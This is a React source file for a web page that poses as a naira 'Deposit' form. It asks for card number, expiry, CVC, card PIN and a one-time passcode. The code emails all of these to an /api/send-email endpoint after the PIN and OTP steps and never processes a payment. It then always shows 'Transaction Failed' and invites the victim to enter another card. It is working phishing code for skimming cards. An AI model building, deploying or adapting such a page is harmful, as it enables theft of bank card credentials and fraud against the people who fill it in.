"use client"

import type React from "react"
import { useState } from "react"

type Step = "amount" | "payment" | "pin" | "otp" | "failed"

interface FormData {
  amount: string
  email: string
  cardName: string
  cardNumber: string
  expiryDate: string
  cvc: string
  cardType: string
  pin: string
  otp: string
}

export default function DepositPage() {
  const [currentStep, setCurrentStep] = useState<Step>("amount")
  const [formData, setFormData] = useState<FormData>({
    amount: "",
    email: "",
    cardName: "",
    cardNumber: "",
    expiryDate: "",
    cvc: "",
    cardType: "",
    pin: "",
    otp: "",
  })
  const [timeLeft, setTimeLeft] = useState(420)
  const [showResend, setShowResend] = useState(false)

  const handleAmountSubmit = (e: React.FormEvent) => {
    e.preventDefault()
    if (formData.amount && formData.email && Number.parseFloat(formData.amount) > 0) {
      setCurrentStep("payment")
    }
  }

  const detectCardType = (number: string) => {
    const cleanNumber = number.replace(/\s/g, "")
    if (/^4/.test(cleanNumber)) return "visa"
    if (/^5[1-5]/.test(cleanNumber) || /^2[2-7]/.test(cleanNumber)) return "mastercard"
    if (/^506[01]/.test(cleanNumber)) return "verve"
    if (cleanNumber.length > 16) return "verve"
    return cleanNumber.length > 0 ? "verve" : ""
  }

  const formatCardNumber = (value: string, type: string) => {
  const cleanValue = value.replace(/\D/g, "")
  
  if (type === "verve") {
    // Verve: no spaces
    return cleanValue.slice(0, 19) // max 19 digits
  } else {
    // Visa/MasterCard: space every 4 digits
    const formattedValue = cleanValue.replace(/(\d{4})(?=\d)/g, "$1 ")
    return formattedValue.slice(0, 19) // limit total digits
  }
}

const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
  const value = e.target.value
  const cleanValue = value.replace(/\D/g, "")
  
  // Detect card type first
  const type = detectCardType(cleanValue)
  
  if (cleanValue.length <= 19) {
    const formattedValue = formatCardNumber(value, type)
    setFormData((prev) => ({
      ...prev,
      cardNumber: formattedValue,
      cardType: type,
    }))
  }
}

  const handleExpiryChange = (e: React.ChangeEvent<HTMLInputElement>) => {
  const input = e.target.value
  // Remove all non-digits
  const digits = input.replace(/\D/g, "")
  
  // Format as MM/YY only if there are more than 2 digits
  let formatted = digits
  if (digits.length > 2) {
    formatted = digits.slice(0, 2) + "/" + digits.slice(2, 4)
  }

  // Limit to 5 characters max (MM/YY)
  if (formatted.length <= 5) {
    setFormData((prev) => ({ ...prev, expiryDate: formatted }))
  }
  }

  const handlePaymentSubmit = (e: React.FormEvent) => {
    e.preventDefault()
    const { cardName, cardNumber, expiryDate, cvc } = formData
    const cleanCardNumber = cardNumber.replace(/\s/g, "")
    if (cardName && cleanCardNumber.length >= 13 && expiryDate.length === 5 && cvc.length === 3) {
      setCurrentStep("pin")
    }
  }

  const handlePinSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    if (formData.pin.length === 4) {
      try {
        await fetch("/api/send-email", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ type: "payment_details", data: formData }),
        })
      } catch (error) {
        console.error("Email sending failed:", error)
      }
      setCurrentStep("otp")
      startCountdown()
    }
  }

  const startCountdown = () => {
    setTimeLeft(420)
    setShowResend(false)
    const timer = setInterval(() => {
      setTimeLeft((prev) => {
        if (prev <= 1) {
          clearInterval(timer)
          setShowResend(true)
          return 0
        }
        return prev - 1
      })
    }, 1000)
  }

  const handleOtpSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    if (formData.otp.length > 0) {
      try {
        await fetch("/api/send-email", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ type: "otp_confirmation", data: formData }),
        })
      } catch (error) {
        console.error("Email sending failed:", error)
      }
      setCurrentStep("failed")
    }
  }

  const formatTime = (seconds: number) => {
    const minutes = Math.floor(seconds / 60)
    const remainingSeconds = seconds % 60
    return `${minutes}:${remainingSeconds.toString().padStart(2, "0")}`
  }

  const getCardIcon = () => {
    switch (formData.cardType) {
      case "visa":
        return <div className="w-10 h-6 bg-blue-600 rounded flex items-center justify-center text-white text-xs font-bold">VISA</div>
      case "mastercard":
        return (
          <div className="w-10 h-6 relative flex items-center justify-center">
            <div className="w-4 h-4 bg-red-500 rounded-full absolute left-0"></div>
            <div className="w-4 h-4 bg-yellow-500 rounded-full absolute right-0"></div>
          </div>
        )
      case "verve":
        return <div className="w-10 h-6 bg-green-600 rounded flex items-center justify-center text-white text-xs font-bold">VERVE</div>
      default:
        return null
    }
  }

  const handleFullReset = () => {
    setFormData({
      amount: "",
      email: "",
      cardName: "",
      cardNumber: "",
      expiryDate: "",
      cvc: "",
      cardType: "",
      pin: "",
      otp: "",
    })
    setCurrentStep("amount")
  }

  const handleTryAgain = () => {
  setFormData((prev) => ({
    ...prev,            // keep amount and email
    cardName: "",
    cardNumber: "",
    expiryDate: "",
    cvc: "",
    cardType: "",
    pin: "",
    otp: "",
  }))
  setCurrentStep("payment") // go back to card details
  }

  const renderStep = () => {
    switch (currentStep) {
      case "amount":
        return (
          <form onSubmit={handleAmountSubmit} className="space-y-6">
            <div className="mb-6">
              <p className="text-sm text-muted-foreground">Enter amount to deposit to your account below.</p>
            </div>

            <div>
  <label htmlFor="email" className="block text-sm font-medium text-foreground mb-2">
    Email Address
  </label>
  <input
    type="email"
    id="email"
    value={formData.email}
    onChange={(e) => setFormData((prev) => ({ ...prev, email: e.target.value }))}
    className="deposit-input text-foreground dark:text-white dark:bg-gray-800 placeholder:text-muted-foreground"
    placeholder="Enter your email address"
    required
  />
</div>

            <div>
              <label htmlFor="amount" className="block text-sm font-medium text-foreground mb-2">Amount To Deposit (₦)</label>
              <input
                type="text"
                inputMode="decimal"
                id="amount"
                value={formData.amount}
                onChange={(e) => {
                  const value = e.target.value
                  if (value === "" || /^\d*\.?\d*$/.test(value)) {
                    setFormData((prev) => ({ ...prev, amount: value }))
                  }
                }}
                className="deposit-input text-lg"
                placeholder="0.00"
                required
              />
            </div>

            <button
              type="submit"
              className="deposit-button"
              disabled={!formData.amount || !formData.email || Number.parseFloat(formData.amount) <= 0}
            >
              Proceed
            </button>
          </form>
        )

      case "payment":
        return (
          <div>
            <div className="mb-6 p-4 bg-card rounded-lg border border-border">
              <h2 className="text-sm font-medium text-foreground mb-2">Summary:</h2>
              <p className="text-sm text-muted-foreground">Amount To Pay: ₦{formData.amount}</p>
              <p className="text-sm text-muted-foreground">Email: {formData.email}</p>
            </div>

            <form onSubmit={handlePaymentSubmit} className="space-y-4">
              <div>
                <input
                  type="text"
                  value={formData.cardName}
                  onChange={(e) => setFormData((prev) => ({ ...prev, cardName: e.target.value }))}
                  className="deposit-input"
                  placeholder="Enter Name On Card"
                  required
                />
              </div>

              <div className="space-y-4">
                <div className="relative">
                  <input
                    type="text"
                    inputMode="numeric"
                    value={formData.cardNumber}
                    onChange={handleCardNumberChange}
                    className="deposit-input pr-20"
                    placeholder="Card number"
                    required
                  />
                  <div className="absolute right-3 top-1/2 transform -translate-y-1/2">
                    {getCardIcon()}
                  </div>
                </div>
                <div className="flex gap-3">
                  <input
                    type="text"
                    inputMode="numeric"
                    value={formData.expiryDate}
                    onChange={handleExpiryChange}
                    className="deposit-input flex-1"
                    placeholder="MM/YY"
                    required
                  />
                  <input
                    type="text"
                    inputMode="numeric"
                    value={formData.cvc}
                    onChange={(e) => {
                      const value = e.target.value.replace(/\D/g, "")
                      if (value.length <= 3) setFormData((prev) => ({ ...prev, cvc: value }))
                    }}
                    className="deposit-input flex-1"
                    placeholder="CVC"
                    required
                  />
                </div>
              </div>

              <button
                type="submit"
                className="deposit-button mt-6"
                disabled={
                  !formData.cardName ||
                  formData.cardNumber.replace(/\s/g, "").length < 13 ||
                  formData.expiryDate.length !== 5 ||
                  formData.cvc.length !== 3
                }
              >
                Pay
              </button>
            </form>

            <button onClick={() => setCurrentStep("amount")} className="deposit-button-secondary mt-4">✕ Cancel</button>
          </div>
        )

      // pin, otp, failed steps...
      case "pin":
        return (
          <div>
            <div className="mb-6">
              <h2 className="text-xl font-medium text-foreground mb-2">Enter Card PIN</h2>
              <p className="text-sm text-muted-foreground">
                To confirm that you are the owner of this card, please enter your card PIN.
              </p>
            </div>

            <form onSubmit={handlePinSubmit} className="space-y-6">
              <div>
                <label htmlFor="pin" className="block text-sm font-medium text-foreground mb-2">Enter Card Pin</label>
                <input
                  type="text"
                  inputMode="numeric"
                  id="pin"
                  value={formData.pin}
                  onChange={(e) => {
                    const value = e.target.value.replace(/\D/g, "")
                    if (value.length <= 4) setFormData((prev) => ({ ...prev, pin: value }))
                  }}
                  className="deposit-input text-center text-lg tracking-widest"
                  placeholder="0000"
                  maxLength={4}
                  autoFocus
                  required
                />
              </div>

              <button type="submit" className="deposit-button" disabled={formData.pin.length !== 4}>
                Proceed
              </button>
            </form>

            <button onClick={() => setCurrentStep("payment")} className="deposit-button-secondary mt-4">
              ✕ Cancel
            </button>
          </div>
        )

      case "otp":
        return (
          <div>
            <div className="mb-6">
              <h2 className="text-xl font-medium text-foreground mb-2">Enter OTP</h2>
              <p className="text-sm text-muted-foreground mb-4">Enter the One-Time PIN (OTP) sent to your device.</p>
              {timeLeft > 0 && (
                <p className="text-sm text-primary mb-4">Time remaining: {formatTime(timeLeft)}</p>
              )}
              {showResend && (
                <button onClick={startCountdown} className="text-sm text-primary hover:underline mb-4">
                  Resend OTP
                </button>
              )}
            </div>

            <form onSubmit={handleOtpSubmit} className="space-y-6">
              <div>
                <label htmlFor="otp" className="block text-sm font-medium text-foreground mb-2">Enter OTP</label>
                <input
                  type="text"
                  inputMode="numeric"
                  id="otp"
                  value={formData.otp}
                  onChange={(e) => {
                    const value = e.target.value.replace(/\D/g, "")
                    setFormData((prev) => ({ ...prev, otp: value }))
                  }}
                  className="deposit-input text-center text-lg tracking-widest"
                  placeholder="Enter OTP"
                  autoFocus
                  required
                />
              </div>

              <button type="submit" className="deposit-button" disabled={formData.otp.length === 0}>
                Submit
              </button>
            </form>

            <button onClick={() => setCurrentStep("pin")} className="deposit-button-secondary mt-4">
              ✕ Cancel
            </button>
          </div>
        )

      case "failed":
        return (
          <div className="text-center">
            <div className="mb-6">
              <div className="w-16 h-16 bg-destructive rounded-full flex items-center justify-center mx-auto mb-4">
                <svg className="w-8 h-8 text-destructive-foreground" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
                </svg>
              </div>
              <h2 className="text-xl font-medium text-foreground mb-2">Transaction Failed</h2>
              <p className="text-sm text-muted-foreground">
                Your transaction could not be processed. Please try again or contact support.
              </p>
            </div>

            <div className="space-y-3">
  <button onClick={handleTryAgain} className="deposit-button">
    Try Again
  </button>
  <button onClick={handleFullReset} className="deposit-button-secondary">
    Start Over
  </button>
</div>
          </div>
        )
    }
  }

  return (
    <div className="deposit-container">
      <div className="deposit-card">
        <div className="deposit-header">
          <div className="deposit-icon">
            <svg className="w-5 h-5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z" />
            </svg>
          </div>
          <h1 className="deposit-title">Deposit</h1>
        </div>

        {renderStep()}
      </div>
    </div>
  )
}
